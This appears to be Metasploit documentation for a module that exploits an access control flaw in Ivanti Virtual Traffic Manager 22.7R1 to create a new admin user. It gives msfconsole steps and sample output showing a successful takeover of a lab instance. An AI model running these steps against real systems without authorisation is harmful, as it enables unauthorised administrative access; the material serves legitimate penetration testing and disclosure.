## Vulnerable Application

This module exploits an access control issue in Ivanti Virtual Traffic Manager (VTM) 22.7R1, by adding a new
administrative user to the web interface of the application.

The original advisory is available [here](https://packetstormsecurity.com/files/179906).

## Testing

The software can be obtained from [here](https://hubgw.docker.com/r/pulsesecure/vtm).

**Successfully tested on**

- 22.7R1 on Ubuntu 20.04.6 LTS

## Verification Steps

1. Deploy Ivanti Virtual Traffic Manager (VTM)
2. Start `msfconsole`
3. `use auxiliary/admin/http/ivanti_vtm_admin`
4. `set RHOSTS <IP>`
5. `run`
6. A new admin user should have been added to the web interface.

## Options

### NEW_USERNAME
Username to be used when creating a new user with admin privileges.

### NEW_PASSWORD
Password to be used when creating a new user with admin privileges.

## Scenarios

Running the module against Virtual Traffic Manager (VTM) 22.7R1 should result in an output
similar to the following:

```
msf6 > use auxiliary/admin/http/ivanti_vtm_admin 
msf6 auxiliary(admin/http/ivanti_vtm_admin) > set RHOSTS 172.17.0.2
msf6 auxiliary(admin/http/ivanti_vtm_admin) > exploit 
[*] Running module against 172.17.0.2

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version: 22.7R1
[+] New admin user was successfully added:
	h4x0r:w00Tw00T!
[+] Login at: https://172.17.0.2:9090/apps/zxtm/login.cgi
[*] Auxiliary module execution completed
```
